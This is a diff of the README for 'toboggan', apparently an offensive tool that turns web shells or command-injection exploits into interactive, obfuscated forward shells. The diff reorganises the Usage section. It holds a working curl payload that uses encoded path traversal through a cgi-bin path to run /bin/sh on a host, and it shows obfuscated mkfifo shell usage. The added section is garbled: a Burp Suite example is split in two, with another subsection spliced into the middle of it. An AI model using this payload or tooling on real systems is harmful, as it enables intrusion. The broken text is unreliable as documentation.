@@ -29,6 +29,51 @@ Or you can directly inject the dependency inside `toboggan`:
 pipx inject toboggan psycopg2
 ```
 
+## 🧸 Usage
+
+Upgrade your web shell or command injection to an interactive shell:
+```shell
+toboggan ~/phpexploit.py
+```
+
+### Advanced: Forward Shell with Obfuscation
+
+For experienced users, launch a fully interactive forward shell with command obfuscation:
+```shell
+toboggan ~/phpexploit.py --obfuscate --fifo --os "linux"
+```
+
+It will start a FiFo named-pipe (a.k.a `mkfifo` shell, forward-shell) on `linux` (`--os`) remote system and obfuscating all commands (`--obfuscation`) using the [hide.py](./toboggan/actions/hide/unix.py) actions.
+
+### Proxy
+
+You can forward to your favorite proxifier such as [`Squid`](https://www.squid-cache.org/) server using the `--proxy` parameter:
+
+```shell
+toboggan ~/phpexploit.py --proxy http://squideu.<something>.io:3128
+```
+
+### [BurpSuite](https://portswigger.net/burp)
+
+To route traffic through Burp Suite:
+```shell
+toboggan ~/ph
+
+### Wrap a shell command
+
+If you are really lazy, you can directly wrap a shell command:
+```shell
+toboggan --exec-wrapper 'curl -s --path-as-is -d "echo Content-Type: text/plain; echo; ||cmd||" "http://192.168.216.188/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"'
+```
+
+pexploit.py --proxy
+```
+
+You can also directly import a Burp saved request that contains the `||cmd||` placeholder:
+```shell
+toboggan --request brequest
+```
+
 ## 🔍 What is an RCE Python Module?
 
 A Remote Code Execution (RCE) module is a Python script that defines how commands are sent to and executed on a remote system. Toboggan uses this module to wrap web shells, command injection exploits, and other RCE vectors, transforming them into a streamlined post-exploitation shell interface.
@@ -69,51 +114,6 @@ Your `execute()` function must handle all quirks of the target system.
 - If the remote interface is slow or unreliable, tune the timeout.
 
 The goal is for Toboggan to call your `execute()` function with any arbitrary command and get the correct output, as if you typed it in a shell.
-
-## 🧸 Usage
-
-### Basic Shell Upgrade
-
-Upgrade your web shell or command injection to an interactive shell:
-```shell
-toboggan ~/phpexploit.py
-```
-
-### Advanced: Forward Shell with Obfuscation
-
-For experienced users, launch a fully interactive forward shell with command obfuscation:
-```shell
-toboggan ~/phpexploit.py --obfuscate --fifo --os "linux"
-```
-
-It will start a FiFo named-pipe (a.k.a `mkfifo` shell, forward-shell) on `linux` (`--os`) remote system and obfuscating all commands (`--obfuscation`) using the [hide.py](./toboggan/actions/hide/unix.py) actions.
-
-### Wrap a shell command
-
-If you are really lazy, you can directly wrap a shell command:
-```shell
-toboggan --exec-wrapper 'curl -s --path-as-is -d "echo Content-Type: text/plain; echo; ||cmd||" "http://192.168.216.188/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"'
-```
-
-### Proxy
-
-You can forward to your favorite proxifier such as [`Squid`](https://www.squid-cache.org/) server using the `--proxy` parameter:
-
-```shell
-toboggan ~/phpexploit.py --proxy http://squideu.<something>.io:3128
-```
-
-### [BurpSuite](https://portswigger.net/burp)
-
-To route traffic through Burp Suite:
-```shell
-toboggan ~/phpexploit.py --proxy
-```
-
-You can also directly import a Burp saved request that contains the `||cmd||` placeholder:
-```shell
-toboggan --request brequest
-```
 
 ## 🏗️ Linux Shell Upgrade: From Dumb to Semi-Interactive
 
